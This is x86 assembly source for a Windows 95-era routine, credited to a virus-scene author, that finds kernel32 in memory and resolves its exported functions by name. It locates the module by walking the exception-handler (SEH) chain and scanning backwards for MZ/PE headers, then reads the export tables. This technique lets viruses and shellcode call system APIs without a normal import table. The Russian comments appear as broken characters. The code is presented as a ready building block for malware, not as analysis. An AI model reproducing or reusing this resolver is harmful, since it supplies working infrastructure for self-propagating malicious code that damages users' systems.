   ; *¥áª®«ìª® ¯à®æ¥¤ãà ¯®¨áª /¨¬¯®àâ  kernel32 ¯à®æ¥¤ãà
   ; Deviator//HAZARD
   ; Tnx goes to Udev

   k32 dd  ?
   k32i    dd  ?
   k32e    dd  ?
   k32n    dd  ?
   k32nn   dd  ?
   obase   dd  ?
   opos    dd  ?
   xpos    dd  ?

   ApiInit proc

       mov eax,fs:[0]          ; SEH
   findl:  cmp 4 ptr [eax],-1          ; *®á«¥¤¨© ?
       jz  last                ; “£ã
       mov eax,[eax]
       jmp findl
   last:   mov edi,[eax][4]

   fn: dec edi
       mov ax,'ZM'             ; ˆé¥¬ MZ
   fndk:   cmp [edi],ax
       jz  mz
       dec edi
       jmp fndk
   mz: mov ebx,edi
       mov eax,[edi][3Ch]          ; *¥à¥¬ á¬¥é¨¥   PE header
       cmp eax,3000h           ; > 3000h ? (¯à®áâ® ¢ Win95
       jae fn              ; MZ ¢áâà¥ç ¥âáï ¢ á ¬®¬
       add ebx,eax             ; kernel32,  ¬¥ ®¡«®¬ SEH
       cmp 4 ptr [ebx],'EP'        ; î§ âì ¤«ï ¯à¥¤®â¢à é¥¨ï
       jnz fn              ; ®è¨¡®ª )
       mov eax,edi
       mov [k32][ebp],edi          ; Store Kernel32 ImageBase
       add edi,[ebx][54h]
       mov [k32i][ebp],edi         ; Store Kernel32 VA

       mov edx,[ebx][78h]
       add edx,eax
       mov [k32e][ebp],edx         ; Store Kernel32 Export table

       mov ecx,[edx][10h]          ; Ordinal Base
       mov [obase][ebp],ecx

       mov ecx,[edx][24h]          ; Ordinal RVA
       add ecx,eax
       mov [opos][ebp],ecx

       mov ecx,[edx][1Ch]
       add ecx,eax
       mov [xpos][ebp],ecx         ; Export table

       mov ecx,[edx][20h]
       add ecx,eax
       mov [k32n][ebp],ecx         ; Export names

       mov ecx,[edx][18h]
       mov [k32nn][ebp],ecx        ; Number of export names

       ret
   ApiInit endp

   ImportApi   proc            ; EDi - import name,EDX - Len of name
       mov esi,[k32n][ebp]     ; *à®æ¥¤ãàª  ¨¬¯®àâ  ã¦®© äãªæ¨¨
       mov ecx,[k32nn][ebp]
       xor ebx,ebx         ; ¢®§¢à é ¥â ¢ EAX «¨¡® 0,¥á«¨
   FindIt: lodsd               ; ¥â â ª®© äãªæ¨¨ ¢ íªá¯®àâ¥
       push    esi edi ecx     ; ¨«¨ ¥¥  ¤à¥á.
       add eax,[k32][ebp]
       xchg    eax,esi
       mov ecx,edx
   rep cmpsb
       pop ecx edi esi
       jz  ItsIt
       inc ebx
       loop    FindIt
       xor eax,eax
       ret
   ItsIt:  inc ebx
       lea esi,[ebx*2]
       add esi,[opos][ebp]
       movzx   eax,2 ptr [esi]
       sub eax,[obase][ebp]
       shl eax,2
       add eax,[xpos][ebp]
       mov eax,[eax]
       add eax,[k32][ebp]
       ret
   ImportApi   endp
